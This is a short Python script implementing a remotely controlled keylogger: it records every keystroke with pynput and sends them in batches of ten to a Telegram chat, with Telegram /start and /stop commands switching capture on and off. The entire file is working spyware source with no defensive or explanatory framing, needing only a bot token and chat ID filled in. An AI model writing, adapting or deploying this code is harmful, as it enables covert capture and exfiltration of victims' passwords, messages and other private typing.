import logging
import threading
from pynput import keyboard
from telegram.ext import Updater, CommandHandler
import telegram

# --- CONFIG ---
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"  # Your personal Telegram ID
capture_enabled = False
key_buffer = []

# --- TELEGRAM SETUP ---
logging.basicConfig(level=logging.INFO)
updater = Updater(BOT_TOKEN, use_context=True)
dispatcher = updater.dispatcher
bot = telegram.Bot(token=BOT_TOKEN)

# --- KEYLOGGER FUNCTION ---
def on_press(key):
    global capture_enabled, key_buffer
    if capture_enabled:
        try:
            key_buffer.append(key.char)
        except AttributeError:
            key_buffer.append(f"[{key.name}]")
        if len(key_buffer) >= 10:  # send in batches of 10
            send_keystrokes()

def send_keystrokes():
    global key_buffer
    if key_buffer:
        text = "".join(key_buffer)
        bot.send_message(chat_id=CHAT_ID, text=f"Keys: {text}")
        key_buffer = []

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# --- TELEGRAM COMMANDS ---
def start(update, context):
    global capture_enabled
    capture_enabled = True
    update.message.reply_text("✅ Keylogging started.")
    
def stop(update, context):
    global capture_enabled
    capture_enabled = False
    update.message.reply_text("⛔ Keylogging stopped.")

dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("stop", stop))

# --- RUN ---
start_keylogger()
updater.start_polling()
updater.idle()
